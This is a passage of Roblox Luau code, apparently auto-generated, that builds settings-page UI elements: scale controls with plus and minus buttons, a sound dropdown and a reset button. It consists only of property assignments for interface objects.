G.UICorner_138 = Instance.new("UICorner")
G.UICorner_138.CornerRadius = UDim.new(0, 14)
G.UICorner_138.Parent = G.Frame_131

-- UIStroke_74 (UIStroke)
G.UIStroke_74 = Instance.new("UIStroke")
G.UIStroke_74.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_74.Parent = G.Frame_131

-- TextLabel_73 (TextLabel)
G.TextLabel_73 = Instance.new("TextLabel")
G.TextLabel_73.BackgroundTransparency = 1
G.TextLabel_73.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_73.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_73.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_73.Text = "Buttons as Panel"
G.TextLabel_73.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_73.TextSize = 14
G.TextLabel_73.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_73.Parent = G.Frame_131

-- Frame_132 (Frame)
G.Frame_132 = Instance.new("Frame")
G.Frame_132.BackgroundColor3 = Color3.fromRGB(28, 28, 35)
G.Frame_132.BorderSizePixel = 0
G.Frame_132.Position = UDim2.new(1, -56, 0.5, -12)
G.Frame_132.Size = UDim2.new(0, 46, 0, 24)
G.Frame_132.ZIndex = 3
G.Frame_132.Parent = G.Frame_131

-- UICorner_139 (UICorner)
G.UICorner_139 = Instance.new("UICorner")
G.UICorner_139.CornerRadius = UDim.new(1, 0)
G.UICorner_139.Parent = G.Frame_132

-- Frame_133 (Frame)
G.Frame_133 = Instance.new("Frame")
G.Frame_133.BackgroundColor3 = Color3.fromRGB(90, 90, 100)
G.Frame_133.BorderSizePixel = 0
G.Frame_133.Position = UDim2.new(0, 3, 0.5, -9)
G.Frame_133.Size = UDim2.new(0, 18, 0, 18)
G.Frame_133.ZIndex = 4
G.Frame_133.Parent = G.Frame_132

-- UICorner_140 (UICorner)
G.UICorner_140 = Instance.new("UICorner")
G.UICorner_140.CornerRadius = UDim.new(1, 0)
G.UICorner_140.Parent = G.Frame_133

-- TextButton_35 (TextButton)
G.TextButton_35 = Instance.new("TextButton")
G.TextButton_35.BackgroundTransparency = 1
G.TextButton_35.Size = UDim2.new(1, 0, 1, 0)
G.TextButton_35.ZIndex = 5
G.TextButton_35.AutoButtonColor = false
G.TextButton_35.Text = ""
G.TextButton_35:SetAttribute("PrintedSoundWired", true)
G.TextButton_35.Parent = G.Frame_132

-- Frame_134 (Frame)
G.Frame_134 = Instance.new("Frame")
G.Frame_134.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_134.BorderSizePixel = 0
G.Frame_134.ClipsDescendants = true
G.Frame_134.LayoutOrder = 71
G.Frame_134.Size = UDim2.new(1, 0, 0, 40)
G.Frame_134.Parent = G.Page4

-- UICorner_141 (UICorner)
G.UICorner_141 = Instance.new("UICorner")
G.UICorner_141.CornerRadius = UDim.new(0, 14)
G.UICorner_141.Parent = G.Frame_134

-- UIStroke_75 (UIStroke)
G.UIStroke_75 = Instance.new("UIStroke")
G.UIStroke_75.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_75.Parent = G.Frame_134

-- TextLabel_74 (TextLabel)
G.TextLabel_74 = Instance.new("TextLabel")
G.TextLabel_74.BackgroundTransparency = 1
G.TextLabel_74.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_74.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_74.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_74.Text = "GUI Scale"
G.TextLabel_74.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_74.TextSize = 14
G.TextLabel_74.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_74.Parent = G.Frame_134

-- TextLabel_75 (TextLabel)
G.TextLabel_75 = Instance.new("TextLabel")
G.TextLabel_75.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
G.TextLabel_75.BorderSizePixel = 0
G.TextLabel_75.Position = UDim2.new(1, -136, 0.5, -13)
G.TextLabel_75.Size = UDim2.new(0, 52, 0, 26)
G.TextLabel_75.ZIndex = 8
G.TextLabel_75.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_75.Text = "75%"
G.TextLabel_75.TextColor3 = Color3.fromRGB(195, 198, 210)
G.TextLabel_75.TextSize = 12
G.TextLabel_75.Parent = G.Frame_134

-- UICorner_142 (UICorner)
G.UICorner_142 = Instance.new("UICorner")
G.UICorner_142.CornerRadius = UDim.new(0, 7)
G.UICorner_142.Parent = G.TextLabel_75

-- TextButton_36 (TextButton)
G.TextButton_36 = Instance.new("TextButton")
G.TextButton_36.BackgroundColor3 = Color3.fromRGB(32, 32, 40)
G.TextButton_36.BorderSizePixel = 0
G.TextButton_36.Position = UDim2.new(1, -78, 0.5, -14)
G.TextButton_36.Size = UDim2.new(0, 34, 0, 28)
G.TextButton_36.ZIndex = 9
G.TextButton_36.AutoButtonColor = false
G.TextButton_36.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextButton_36.Text = "-"
G.TextButton_36.TextColor3 = Color3.fromRGB(190, 193, 205)
G.TextButton_36.TextSize = 15
G.TextButton_36:SetAttribute("PrintedSoundWired", true)
G.TextButton_36.Parent = G.Frame_134

-- UICorner_143 (UICorner)
G.UICorner_143 = Instance.new("UICorner")
G.UICorner_143.Parent = G.TextButton_36

-- TextButton_37 (TextButton)
G.TextButton_37 = Instance.new("TextButton")
G.TextButton_37.BackgroundColor3 = Color3.fromRGB(32, 32, 40)
G.TextButton_37.BorderSizePixel = 0
G.TextButton_37.Position = UDim2.new(1, -40, 0.5, -14)
G.TextButton_37.Size = UDim2.new(0, 34, 0, 28)
G.TextButton_37.ZIndex = 9
G.TextButton_37.AutoButtonColor = false
G.TextButton_37.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextButton_37.Text = "+"
G.TextButton_37.TextColor3 = Color3.fromRGB(190, 193, 205)
G.TextButton_37.TextSize = 15
G.TextButton_37:SetAttribute("PrintedSoundWired", true)
G.TextButton_37.Parent = G.Frame_134

-- UICorner_144 (UICorner)
G.UICorner_144 = Instance.new("UICorner")
G.UICorner_144.Parent = G.TextButton_37

-- Frame_135 (Frame)
G.Frame_135 = Instance.new("Frame")
G.Frame_135.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_135.BorderSizePixel = 0
G.Frame_135.ClipsDescendants = true
G.Frame_135.LayoutOrder = 72
G.Frame_135.Size = UDim2.new(1, 0, 0, 40)
G.Frame_135.Parent = G.Page4

-- UICorner_145 (UICorner)
G.UICorner_145 = Instance.new("UICorner")
G.UICorner_145.CornerRadius = UDim.new(0, 14)
G.UICorner_145.Parent = G.Frame_135

-- UIStroke_76 (UIStroke)
G.UIStroke_76 = Instance.new("UIStroke")
G.UIStroke_76.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_76.Parent = G.Frame_135

-- TextLabel_76 (TextLabel)
G.TextLabel_76 = Instance.new("TextLabel")
G.TextLabel_76.BackgroundTransparency = 1
G.TextLabel_76.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_76.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_76.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_76.Text = "Buttons Scale"
G.TextLabel_76.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_76.TextSize = 14
G.TextLabel_76.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_76.Parent = G.Frame_135

-- TextLabel_77 (TextLabel)
G.TextLabel_77 = Instance.new("TextLabel")
G.TextLabel_77.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
G.TextLabel_77.BorderSizePixel = 0
G.TextLabel_77.Position = UDim2.new(1, -136, 0.5, -13)
G.TextLabel_77.Size = UDim2.new(0, 52, 0, 26)
G.TextLabel_77.ZIndex = 8
G.TextLabel_77.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_77.Text = "80%"
G.TextLabel_77.TextColor3 = Color3.fromRGB(195, 198, 210)
G.TextLabel_77.TextSize = 12
G.TextLabel_77.Parent = G.Frame_135

-- UICorner_146 (UICorner)
G.UICorner_146 = Instance.new("UICorner")
G.UICorner_146.CornerRadius = UDim.new(0, 7)
G.UICorner_146.Parent = G.TextLabel_77

-- TextButton_38 (TextButton)
G.TextButton_38 = Instance.new("TextButton")
G.TextButton_38.BackgroundColor3 = Color3.fromRGB(32, 32, 40)
G.TextButton_38.BorderSizePixel = 0
G.TextButton_38.Position = UDim2.new(1, -78, 0.5, -14)
G.TextButton_38.Size = UDim2.new(0, 34, 0, 28)
G.TextButton_38.ZIndex = 9
G.TextButton_38.AutoButtonColor = false
G.TextButton_38.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextButton_38.Text = "-"
G.TextButton_38.TextColor3 = Color3.fromRGB(190, 193, 205)
G.TextButton_38.TextSize = 15
G.TextButton_38:SetAttribute("PrintedSoundWired", true)
G.TextButton_38.Parent = G.Frame_135

-- UICorner_147 (UICorner)
G.UICorner_147 = Instance.new("UICorner")
G.UICorner_147.Parent = G.TextButton_38

-- TextButton_39 (TextButton)
G.TextButton_39 = Instance.new("TextButton")
G.TextButton_39.BackgroundColor3 = Color3.fromRGB(32, 32, 40)
G.TextButton_39.BorderSizePixel = 0
G.TextButton_39.Position = UDim2.new(1, -40, 0.5, -14)
G.TextButton_39.Size = UDim2.new(0, 34, 0, 28)
G.TextButton_39.ZIndex = 9
G.TextButton_39.AutoButtonColor = false
G.TextButton_39.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextButton_39.Text = "+"
G.TextButton_39.TextColor3 = Color3.fromRGB(190, 193, 205)
G.TextButton_39.TextSize = 15
G.TextButton_39:SetAttribute("PrintedSoundWired", true)
G.TextButton_39.Parent = G.Frame_135

-- UICorner_148 (UICorner)
G.UICorner_148 = Instance.new("UICorner")
G.UICorner_148.Parent = G.TextButton_39

-- Frame_136 (Frame)
G.Frame_136 = Instance.new("Frame")
G.Frame_136.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_136.BorderSizePixel = 0
G.Frame_136.ClipsDescendants = true
G.Frame_136.LayoutOrder = 73
G.Frame_136.Size = UDim2.new(1, 0, 0, 40)
G.Frame_136.Parent = G.Page4

-- UICorner_149 (UICorner)
G.UICorner_149 = Instance.new("UICorner")
G.UICorner_149.CornerRadius = UDim.new(0, 14)
G.UICorner_149.Parent = G.Frame_136

-- UIStroke_77 (UIStroke)
G.UIStroke_77 = Instance.new("UIStroke")
G.UIStroke_77.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_77.Parent = G.Frame_136

-- TextLabel_78 (TextLabel)
G.TextLabel_78 = Instance.new("TextLabel")
G.TextLabel_78.BackgroundTransparency = 1
G.TextLabel_78.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_78.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_78.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_78.Text = "Steal Bar Scale"
G.TextLabel_78.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_78.TextSize = 14
G.TextLabel_78.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_78.Parent = G.Frame_136

-- TextLabel_79 (TextLabel)
G.TextLabel_79 = Instance.new("TextLabel")
G.TextLabel_79.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
G.TextLabel_79.BorderSizePixel = 0
G.TextLabel_79.Position = UDim2.new(1, -136, 0.5, -13)
G.TextLabel_79.Size = UDim2.new(0, 52, 0, 26)
G.TextLabel_79.ZIndex = 8
G.TextLabel_79.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_79.Text = "60%"
G.TextLabel_79.TextColor3 = Color3.fromRGB(195, 198, 210)
G.TextLabel_79.TextSize = 12
G.TextLabel_79.Parent = G.Frame_136

-- UICorner_150 (UICorner)
G.UICorner_150 = Instance.new("UICorner")
G.UICorner_150.CornerRadius = UDim.new(0, 7)
G.UICorner_150.Parent = G.TextLabel_79

-- TextButton_40 (TextButton)
G.TextButton_40 = Instance.new("TextButton")
G.TextButton_40.BackgroundColor3 = Color3.fromRGB(32, 32, 40)
G.TextButton_40.BorderSizePixel = 0
G.TextButton_40.Position = UDim2.new(1, -78, 0.5, -14)
G.TextButton_40.Size = UDim2.new(0, 34, 0, 28)
G.TextButton_40.ZIndex = 9
G.TextButton_40.AutoButtonColor = false
G.TextButton_40.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextButton_40.Text = "-"
G.TextButton_40.TextColor3 = Color3.fromRGB(190, 193, 205)
G.TextButton_40.TextSize = 15
G.TextButton_40:SetAttribute("PrintedSoundWired", true)
G.TextButton_40.Parent = G.Frame_136

-- UICorner_151 (UICorner)
G.UICorner_151 = Instance.new("UICorner")
G.UICorner_151.Parent = G.TextButton_40

-- TextButton_41 (TextButton)
G.TextButton_41 = Instance.new("TextButton")
G.TextButton_41.BackgroundColor3 = Color3.fromRGB(32, 32, 40)
G.TextButton_41.BorderSizePixel = 0
G.TextButton_41.Position = UDim2.new(1, -40, 0.5, -14)
G.TextButton_41.Size = UDim2.new(0, 34, 0, 28)
G.TextButton_41.ZIndex = 9
G.TextButton_41.AutoButtonColor = false
G.TextButton_41.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextButton_41.Text = "+"
G.TextButton_41.TextColor3 = Color3.fromRGB(190, 193, 205)
G.TextButton_41.TextSize = 15
G.TextButton_41:SetAttribute("PrintedSoundWired", true)
G.TextButton_41.Parent = G.Frame_136

-- UICorner_152 (UICorner)
G.UICorner_152 = Instance.new("UICorner")
G.UICorner_152.Parent = G.TextButton_41

-- Frame_137 (Frame)
G.Frame_137 = Instance.new("Frame")
G.Frame_137.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_137.BorderSizePixel = 0
G.Frame_137.ClipsDescendants = true
G.Frame_137.LayoutOrder = 74
G.Frame_137.Size = UDim2.new(1, 0, 0, 40)
G.Frame_137.Parent = G.Page4

-- UICorner_153 (UICorner)
G.UICorner_153 = Instance.new("UICorner")
G.UICorner_153.CornerRadius = UDim.new(0, 14)
G.UICorner_153.Parent = G.Frame_137

-- UIStroke_78 (UIStroke)
G.UIStroke_78 = Instance.new("UIStroke")
G.UIStroke_78.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_78.Parent = G.Frame_137

-- TextLabel_80 (TextLabel)
G.TextLabel_80 = Instance.new("TextLabel")
G.TextLabel_80.BackgroundTransparency = 1
G.TextLabel_80.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_80.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_80.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_80.Text = "Controller Scale"
G.TextLabel_80.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_80.TextSize = 14
G.TextLabel_80.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_80.Parent = G.Frame_137

-- TextLabel_81 (TextLabel)
G.TextLabel_81 = Instance.new("TextLabel")
G.TextLabel_81.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
G.TextLabel_81.BorderSizePixel = 0
G.TextLabel_81.Position = UDim2.new(1, -136, 0.5, -13)
G.TextLabel_81.Size = UDim2.new(0, 52, 0, 26)
G.TextLabel_81.ZIndex = 8
G.TextLabel_81.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_81.Text = "100%"
G.TextLabel_81.TextColor3 = Color3.fromRGB(195, 198, 210)
G.TextLabel_81.TextSize = 12
G.TextLabel_81.Parent = G.Frame_137

-- UICorner_154 (UICorner)
G.UICorner_154 = Instance.new("UICorner")
G.UICorner_154.CornerRadius = UDim.new(0, 7)
G.UICorner_154.Parent = G.TextLabel_81

-- TextButton_42 (TextButton)
G.TextButton_42 = Instance.new("TextButton")
G.TextButton_42.BackgroundColor3 = Color3.fromRGB(32, 32, 40)
G.TextButton_42.BorderSizePixel = 0
G.TextButton_42.Position = UDim2.new(1, -78, 0.5, -14)
G.TextButton_42.Size = UDim2.new(0, 34, 0, 28)
G.TextButton_42.ZIndex = 9
G.TextButton_42.AutoButtonColor = false
G.TextButton_42.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextButton_42.Text = "-"
G.TextButton_42.TextColor3 = Color3.fromRGB(190, 193, 205)
G.TextButton_42.TextSize = 15
G.TextButton_42:SetAttribute("PrintedSoundWired", true)
G.TextButton_42.Parent = G.Frame_137

-- UICorner_155 (UICorner)
G.UICorner_155 = Instance.new("UICorner")
G.UICorner_155.Parent = G.TextButton_42

-- TextButton_43 (TextButton)
G.TextButton_43 = Instance.new("TextButton")
G.TextButton_43.BackgroundColor3 = Color3.fromRGB(32, 32, 40)
G.TextButton_43.BorderSizePixel = 0
G.TextButton_43.Position = UDim2.new(1, -40, 0.5, -14)
G.TextButton_43.Size = UDim2.new(0, 34, 0, 28)
G.TextButton_43.ZIndex = 9
G.TextButton_43.AutoButtonColor = false
G.TextButton_43.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextButton_43.Text = "+"
G.TextButton_43.TextColor3 = Color3.fromRGB(190, 193, 205)
G.TextButton_43.TextSize = 15
G.TextButton_43:SetAttribute("PrintedSoundWired", true)
G.TextButton_43.Parent = G.Frame_137

-- UICorner_156 (UICorner)
G.UICorner_156 = Instance.new("UICorner")
G.UICorner_156.Parent = G.TextButton_43

-- Frame_138 (Frame)
G.Frame_138 = Instance.new("Frame")
G.Frame_138.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_138.BorderSizePixel = 0
G.Frame_138.ClipsDescendants = true
G.Frame_138.LayoutOrder = 75
G.Frame_138.Size = UDim2.new(1, 0, 0, 40)
G.Frame_138.Parent = G.Page4

-- UICorner_157 (UICorner)
G.UICorner_157 = Instance.new("UICorner")
G.UICorner_157.CornerRadius = UDim.new(0, 14)
G.UICorner_157.Parent = G.Frame_138

-- UIStroke_79 (UIStroke)
G.UIStroke_79 = Instance.new("UIStroke")
G.UIStroke_79.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_79.Parent = G.Frame_138

-- TextLabel_82 (TextLabel)
G.TextLabel_82 = Instance.new("TextLabel")
G.TextLabel_82.BackgroundTransparency = 1
G.TextLabel_82.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_82.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_82.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_82.Text = "Keyboard Scale"
G.TextLabel_82.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_82.TextSize = 14
G.TextLabel_82.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_82.Parent = G.Frame_138

-- TextLabel_83 (TextLabel)
G.TextLabel_83 = Instance.new("TextLabel")
G.TextLabel_83.BackgroundColor3 = Color3.fromRGB(18, 18, 24)
G.TextLabel_83.BorderSizePixel = 0
G.TextLabel_83.Position = UDim2.new(1, -136, 0.5, -13)
G.TextLabel_83.Size = UDim2.new(0, 52, 0, 26)
G.TextLabel_83.ZIndex = 8
G.TextLabel_83.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_83.Text = "90%"
G.TextLabel_83.TextColor3 = Color3.fromRGB(195, 198, 210)
G.TextLabel_83.TextSize = 12
G.TextLabel_83.Parent = G.Frame_138

-- UICorner_158 (UICorner)
G.UICorner_158 = Instance.new("UICorner")
G.UICorner_158.CornerRadius = UDim.new(0, 7)
G.UICorner_158.Parent = G.TextLabel_83

-- TextButton_44 (TextButton)
G.TextButton_44 = Instance.new("TextButton")
G.TextButton_44.BackgroundColor3 = Color3.fromRGB(32, 32, 40)
G.TextButton_44.BorderSizePixel = 0
G.TextButton_44.Position = UDim2.new(1, -78, 0.5, -14)
G.TextButton_44.Size = UDim2.new(0, 34, 0, 28)
G.TextButton_44.ZIndex = 9
G.TextButton_44.AutoButtonColor = false
G.TextButton_44.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextButton_44.Text = "-"
G.TextButton_44.TextColor3 = Color3.fromRGB(190, 193, 205)
G.TextButton_44.TextSize = 15
G.TextButton_44:SetAttribute("PrintedSoundWired", true)
G.TextButton_44.Parent = G.Frame_138

-- UICorner_159 (UICorner)
G.UICorner_159 = Instance.new("UICorner")
G.UICorner_159.Parent = G.TextButton_44

-- TextButton_45 (TextButton)
G.TextButton_45 = Instance.new("TextButton")
G.TextButton_45.BackgroundColor3 = Color3.fromRGB(32, 32, 40)
G.TextButton_45.BorderSizePixel = 0
G.TextButton_45.Position = UDim2.new(1, -40, 0.5, -14)
G.TextButton_45.Size = UDim2.new(0, 34, 0, 28)
G.TextButton_45.ZIndex = 9
G.TextButton_45.AutoButtonColor = false
G.TextButton_45.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextButton_45.Text = "+"
G.TextButton_45.TextColor3 = Color3.fromRGB(190, 193, 205)
G.TextButton_45.TextSize = 15
G.TextButton_45:SetAttribute("PrintedSoundWired", true)
G.TextButton_45.Parent = G.Frame_138

-- UICorner_160 (UICorner)
G.UICorner_160 = Instance.new("UICorner")
G.UICorner_160.Parent = G.TextButton_45

-- Frame_139 (Frame)
G.Frame_139 = Instance.new("Frame")
G.Frame_139.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_139.BorderSizePixel = 0
G.Frame_139.ClipsDescendants = true
G.Frame_139.LayoutOrder = 76
G.Frame_139.Size = UDim2.new(1, 0, 0, 40)
G.Frame_139.Parent = G.Page4

-- UICorner_161 (UICorner)
G.UICorner_161 = Instance.new("UICorner")
G.UICorner_161.CornerRadius = UDim.new(0, 14)
G.UICorner_161.Parent = G.Frame_139

-- UIStroke_80 (UIStroke)
G.UIStroke_80 = Instance.new("UIStroke")
G.UIStroke_80.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_80.Parent = G.Frame_139

-- TextLabel_84 (TextLabel)
G.TextLabel_84 = Instance.new("TextLabel")
G.TextLabel_84.BackgroundTransparency = 1
G.TextLabel_84.Position = UDim2.new(0, 9, 0, 0)
G.TextLabel_84.Size = UDim2.new(0.57999998331069946, 0, 1, 0)
G.TextLabel_84.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_84.Text = "Toggle Sound"
G.TextLabel_84.TextColor3 = Color3.fromRGB(235, 235, 235)
G.TextLabel_84.TextSize = 14
G.TextLabel_84.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_84.Parent = G.Frame_139

-- DropChip_7 (TextButton)
G.DropChip_7 = Instance.new("TextButton")
G.DropChip_7.Name = "DropChip"
G.DropChip_7.BackgroundColor3 = Color3.fromRGB(16, 16, 22)
G.DropChip_7.BorderSizePixel = 0
G.DropChip_7.Position = UDim2.new(1, -130, 0, 7)
G.DropChip_7.Size = UDim2.new(0, 120, 0, 26)
G.DropChip_7.ZIndex = 12
G.DropChip_7.AutoButtonColor = false
G.DropChip_7.Text = ""
G.DropChip_7:SetAttribute("PrintedSoundWired", true)
G.DropChip_7.Parent = G.Frame_139

-- UICorner_162 (UICorner)
G.UICorner_162 = Instance.new("UICorner")
G.UICorner_162.Parent = G.DropChip_7

-- UIStroke_81 (UIStroke)
G.UIStroke_81 = Instance.new("UIStroke")
G.UIStroke_81.Color = Color3.fromRGB(55, 60, 72)
G.UIStroke_81.Transparency = 0.40000000596046448
G.UIStroke_81.Parent = G.DropChip_7

-- TextLabel_85 (TextLabel)
G.TextLabel_85 = Instance.new("TextLabel")
G.TextLabel_85.BackgroundTransparency = 1
G.TextLabel_85.Position = UDim2.new(0, 8, 0, 0)
G.TextLabel_85.Size = UDim2.new(1, -22, 1, 0)
G.TextLabel_85.ZIndex = 13
G.TextLabel_85.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_85.Text = "V1 (Bubble)"
G.TextLabel_85.TextColor3 = Color3.fromRGB(200, 204, 216)
G.TextLabel_85.TextSize = 12
G.TextLabel_85.TextTruncate = Enum.TextTruncate.AtEnd
G.TextLabel_85.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_85.Parent = G.DropChip_7

-- TextLabel_86 (TextLabel)
G.TextLabel_86 = Instance.new("TextLabel")
G.TextLabel_86.BackgroundTransparency = 1
G.TextLabel_86.Position = UDim2.new(1, -18, 0, 0)
G.TextLabel_86.Size = UDim2.new(0, 18, 1, 0)
G.TextLabel_86.ZIndex = 13
G.TextLabel_86.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Bold, Enum.FontStyle.Normal)
G.TextLabel_86.Text = "v"
G.TextLabel_86.TextColor3 = Color3.fromRGB(150, 155, 168)
G.TextLabel_86.TextSize = 11
G.TextLabel_86.Parent = G.DropChip_7

-- Frame_140 (Frame)
G.Frame_140 = Instance.new("Frame")
G.Frame_140.BackgroundColor3 = Color3.fromRGB(14, 14, 18)
G.Frame_140.BorderSizePixel = 0
G.Frame_140.ClipsDescendants = true
G.Frame_140.LayoutOrder = 77
G.Frame_140.Size = UDim2.new(1, 0, 0, 40)
G.Frame_140.Parent = G.Page4

-- UICorner_163 (UICorner)
G.UICorner_163 = Instance.new("UICorner")
G.UICorner_163.CornerRadius = UDim.new(0, 14)
G.UICorner_163.Parent = G.Frame_140

-- UIStroke_82 (UIStroke)
G.UIStroke_82 = Instance.new("UIStroke")
G.UIStroke_82.Color = Color3.fromRGB(22, 22, 28)
G.UIStroke_82.Parent = G.Frame_140

-- TextLabel_87 (TextLabel)
G.TextLabel_87 = Instance.new("TextLabel")
G.TextLabel_87.BackgroundTransparency = 1
G.TextLabel_87.Position = UDim2.new(0, 10, 0, 0)
G.TextLabel_87.Size = UDim2.new(1, -80, 1, 0)
G.TextLabel_87.ZIndex = 5
G.TextLabel_87.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Regular, Enum.FontStyle.Normal)
G.TextLabel_87.Text = "Reset All Settings"
G.TextLabel_87.TextColor3 = Color3.fromRGB(220, 220, 230)
G.TextLabel_87.TextSize = 12
G.TextLabel_87.TextXAlignment = Enum.TextXAlignment.Left
G.TextLabel_87.Parent = G.Frame_140

-- TextButton_46 (TextButton)
G.TextButton_46 = Instance.new("TextButton")
G.TextButton_46.BackgroundColor3 = Color3.fromRGB(255, 80, 90)
G.TextButton_46.BorderSizePixel = 0
G.TextButton_46.Position = UDim2.new(1, -70, 0.5, -12)
G.TextButton_46.Size = UDim2.new(0, 64, 0, 24)
G.TextButton_46.ZIndex = 6
G.TextButton_46.AutoButtonColor = false
G.TextButton_46.FontFace = Font.new("rbxasset://fonts/families/GothamSSm.json", Enum.FontWeight.Heavy, Enum.FontStyle.Normal)
G.TextButton_46.Text = "RESET"
G.TextButton_46.TextColor3 = Color3.fromRGB(255, 255, 255)
G.TextButton_46.TextSize = 11
G.TextButton_46:SetAttribute("PrintedSoundWired", true)
G.TextButton_46.Parent = G.Frame_140

-- UICorner_164 (UICorner)
G.UICorner_164 = Instance.new("UICorner")
G.UICorner_164.CornerRadius = UDim.new(0, 7)
G.UICorner_164.Parent = G.TextButton_46

-- Page5 (ScrollingFrame)
G.Page5 = Instance.new("ScrollingFrame")
G.Page5.Name = "Page5"
G.Page5.BackgroundTransparency = 1
G.Page5.BorderSizePixel = 0
G.Page5.Size = UDim2.new(1, 0, 1, 0)
G.Page5.Visible = false
G.Page5.AutomaticCanvasSize = Enum.AutomaticSize.Y
G.Page5.CanvasSize = UDim2.new(0, 0, 0, 0)
G.Page5.ScrollBarImageTransparency = 1
G.Page5.ScrollBarThickness = 0
G.Page5.Parent = G.Pages

-- UIListLayout_7 (UIListLayout)
G.UIListLayout_7 = Instance.new("UIListLayout")
G.UIListLayout_7.Padding = UDim.new(0, 3)
G.UIListLayout_7.SortOrder = Enum.SortOrder.LayoutOrder
G.UIListLayout_7.Parent = G.Page5

-- UIPadding_5 (UIPadding)
G.UIPadding_5 = Instance.new("UIPadding")
G.UIPadding_5.PaddingBottom = UDim.new(0, 10)
G.UIPadding_5.PaddingLeft = UDim.new(0, 7)
G.UIPadding_5.PaddingRight = UDim.new(0, 7)
G.UIPadding_5.PaddingTop = UDim.new(0, 7)
